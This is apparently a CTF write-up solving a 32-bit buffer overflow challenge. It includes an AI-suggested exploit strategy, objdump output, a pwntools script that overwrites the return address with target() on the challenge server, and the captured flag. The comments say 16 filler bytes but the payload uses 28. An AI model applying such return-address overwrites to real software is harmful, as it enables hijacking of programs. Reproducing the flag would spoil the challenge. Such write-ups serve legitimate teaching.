Namee: Baby Buffer Overflow - 32bit
Value: 394 points
Category: Binary Exploitation
Solves: 148 Solves -
Author: @aenygma

Description:
Can you command this program to where it cannot go?
To get the flag, you must somehow take control of its excecution.
Is it even possible?

Press the Start button on the top-right to begin this challenge.

Attachments: babybufof babybufov.c

Solution:

1. Cracking the source code open, I skimmed it, then I shamlessly fed it to AI, because I don't really know C all that well.

Exploit Strategy

Locate the address of target():

Use tools like GDB or objdump to find the address of target().

Example:

objdump -d babybufov | grep target

This will give you the address of target() (e.g., 0x08049196).

Overflow the buf array:

buf is 16 bytes, so you need 16 bytes of filler to fill the buffer.
After the buffer, the next thing on the stack is the saved return address. This is where you will place the address of target().

2. Finding the target address as advised

┌──(kali㉿kali2024)-[~/CTF/huntress2024/binary_exploitation/baby_buffer_overflow]
└─$ objdump -d babybufov | grep target
080491f5 <target>:

Little-Endian Representation 0x080491f5 is:\xf5\x91\x04\x08

3. Using the following Python script with PwnTools I was able to trigger the Buffer overflow and capture the flag


from pwn import *

# Target information
host = 'challenge.ctf.games'
port = 31110

# Payload: 16 A's + target address (0x080491f5 in little-endian)
payload = b'A' * 28 + b'\xf5\x91\x04\x08'

# Start a connection to the remote server
try:
    r = remote(host, port)

    # Send the payload
    r.sendline(payload)

    # Try to receive a response gracefully
    response = r.recv(timeout=2)  # Use recv() instead of recvall() for partial data
    if response:
        print(response.decode(errors='ignore'))  # Handle any decoding issues
    else:
        print("[INFO] No response received.")

    # Use interactive mode only if the connection is still open
    r.interactive()

except EOFError:
    print("[ERROR] Connection closed unexpectedly.")
except Exception as e:
    print(f"[ERROR] An exception occurred: {e}")

finally:
    r.close()

4. Running the script against the challenge we get the following output

┌──(kali㉿kali2024)-[~/CTF/huntress2024/binary_exploitation/baby_buffer_overflow]
└─$ python3 solve.py
[+] Opening connection to challenge.ctf.games on port 31110: Done
____        _             _            __  _____     _______ _     
| __ )  __ _| |__  _   _  | |__  _   _ / _|/ _ \ \   / /  ___| |    
|  _ \ / _` | '_ \| | | | | '_ \| | | | |_| | | \ \ / /| |_  | |    
| |_) | (_| | |_) | |_| | | |_) | |_| |  _| |_| |\ V / |  _| | |___ 
|____/ \__,_|_.__/ \__, | |_.__/ \__,_|_|  \___/  \_/  |_|   |_____|
                   |___/                                            

               Welcome to Baby Buffer Overflow

Can you command this program to where it cannot go?
To get the flag, you must somehow take control of its excecution.
Is it even possible? 

[*] Switching to interactive mode
Gimme some data!
Jackpot!
$ cat flag
flag{4cd3b4079393e861af489ca063373f98}

4. Flag: flag{4cd3b4079393e861af489ca063373f98}
